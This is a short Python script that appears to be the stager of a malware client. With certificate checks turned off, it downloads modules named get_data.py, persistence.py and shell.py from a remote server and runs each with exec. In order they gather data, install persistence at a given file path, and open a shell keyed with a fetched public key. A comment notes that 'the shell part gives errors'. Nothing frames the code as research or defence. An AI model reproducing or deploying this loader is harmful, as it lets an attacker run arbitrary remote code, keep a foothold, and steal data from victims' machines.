from urllib.request import urlopen
import importlib.util
import os
import subprocess
import ssl
import sys

from cryptography.hazmat.primitives import serialization

def get_public_key(url):
    context = ssl._create_unverified_context()
    # Use the context when opening the URL
    with urlopen(url, context=context) as response:
        code = response.read().decode("utf-8")
    
    # Load the public key into a usable format
    return serialization.load_pem_public_key(code)

# check to see if the scirpt is already Rolling
def create_moduel(url):
    # Create an SSL context that doesn't verify certificates
    context = ssl._create_unverified_context()
    # Use the context when opening the URL
    with urlopen(url, context=context) as response:
        code = response.read().decode("utf-8")

    spec = importlib.util.spec_from_loader("temp", loader=None)
    module = importlib.util.module_from_spec(spec)

    # Execute the code in the module's namespace
    exec(code, module.__dict__)

    # execute the code in the temporary module
    exec(code, module.__dict__)

    return module

def run(url, file_path):
    public_key = get_public_key(f"{url}key")

    module = create_moduel(f"{url}client/get_data.py")

    data = module.run(url)  # works fine the shell part gives errors

    module = create_moduel(f"{url}client/persistence.py")
    module.run(url, file_path)

    module = create_moduel(f"{url}client/shell.py")

    module.run(data, public_key)
